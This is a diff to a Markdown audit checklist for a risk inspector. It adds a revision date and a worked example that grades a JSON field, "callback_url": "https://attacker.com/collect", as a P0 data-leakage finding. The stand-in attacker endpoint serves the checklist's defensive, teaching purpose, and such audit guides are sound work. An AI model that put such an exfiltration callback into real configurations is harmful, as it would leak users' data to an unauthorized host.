@@ -1,11 +1,11 @@
 ---
 title: Risk Explicit Checklist (Lite)
-description: "Condensed Risk Explicit (EX) audit checklist for the sanityops-inspect lite inspector: the 34-subcategory EX classification framework (NL-A / NL-B / NR-O / NR-S), key boundary definitions, impact type labels (D1/D2/D3), severity grading (Explicit·P0/P1/P2), the binary trigger condition label, the three-phase audit workflow, and the report output format. Extracted from risk/explicit.md v1.0; defines no new rules."
+description: "Condensed Risk Explicit (EX) audit checklist for the sanityops-inspect lite inspector: the 34-subcategory EX classification framework (NL-A / NL-B / NR-O / NR-S), key boundary definitions, impact type labels (D1/D2/D3), severity grading (Explicit·P0/P1/P2), the binary trigger condition label, the three-phase audit workflow, and the report output format. Extracted from risk/explicit.md v1.0 (2026-10 revision); defines no new rules."
 ---
 
 # Risk Explicit Checklist (EX, Lite)
 
-> **Provenance**: Condensed from `risk/explicit.md` v1.0 (SanityOps Framework, CC BY-SA 4.0). This file is a compressed extraction for the sanityops-inspect lite inspector and defines NO new rules. On any conflict, `risk/explicit.md` governs.
+> **Provenance**: Condensed from `risk/explicit.md` v1.0 (2026-10 revision) (SanityOps Framework, CC BY-SA 4.0). This file is a compressed extraction for the sanityops-inspect lite inspector and defines NO new rules. On any conflict, `risk/explicit.md` governs.
 
 ## 1. How to use
 
@@ -190,6 +190,13 @@ Otherwise the risk is labeled **"unconditional"**.
 - Classification: NL-B-10
 - Grade: `Explicit·P0·unconditional·to-be-verified`
 - Reason: Conversation summary may be exported externally (data leakage), matching P0 "data or conversation content leakage (including 'may be exported')"; the trigger condition is satisfied by the user's ordinary behavior → "unconditional"; reachability of the cross-object condition chain is handed to Risk Implicit → "to-be-verified".
+- Impact Type: D1
+
+**Example 4 — NR-S-7**: `"callback_url": "https://attacker.com/collect"`
+
+- Classification: NR-S-7
+- Grade: `Explicit·P0·unconditional`
+- Reason: An endpoint/callback field points to an unexpected/unauthorized external address, matching P0 "data or conversation content leakage (including 'may be exported')".
 - Impact Type: D1
 
 ## 11. Three-phase audit workflow (§3.5)
